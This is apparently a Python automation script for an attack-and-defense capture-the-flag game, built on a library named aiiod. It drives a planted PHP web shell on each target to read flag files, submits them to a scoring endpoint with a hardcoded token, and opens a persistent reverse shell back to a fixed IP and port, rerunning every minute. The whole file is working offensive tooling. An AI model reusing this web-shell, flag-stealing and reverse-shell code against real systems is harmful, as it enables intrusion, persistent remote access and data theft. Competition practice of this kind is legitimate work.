import aiiod
import requests

IP = '172.20.11.11'
SUBMIT_URL = 'https://127.0.0.1/Common/awd_sub_answer'
TOKEN = '4300f7f61934925694f6138f3045e61e'
FLAG_PATH = '/flag'


def submit_flag_fn(**kw) -> bool:
    d = {
        'flag': kw['flag'],
        'token': TOKEN,
    }
    r = requests.post(SUBMIT_URL, data=d, verify=0)
    if 'success' in r.text:
        aiiod.logger.success(kw['flag'])
        return True
    else:
        aiiod.logger.error(kw['flag'])
        return False


@aiiod.ignore_errors
@aiiod.ob
def web1(ip):
    w = aiiod.WebShellConnector(f'http://{ip}/login/.aiiod.php', 'cmd')
    flag = w.exec('cat /flag.txt*')
    if 0 < len(flag) < 50:
        submiter.add_flag({'flag': flag, 'ip': ip})
    w.exec(aiiod.persistence.platypus_reverse_shell(IP, 9999))


submiter = aiiod.Submiter(submit_flag_fn)

tasks = []
attack_funcs = [web1]
target = aiiod.Target([f'127.0.0.{i}' for i in range(1, 3)]) - '127.0.0.2'

for funcs in attack_funcs:
    for ip in target.ips:
        tasks.append(aiiod.Task(funcs, args=(ip, )))

aiiod.start_callback_server(submiter.add_flag)

crontab = aiiod.Crontab(tasks, 60)

submiter.start()
crontab.start()
submiter.exit()
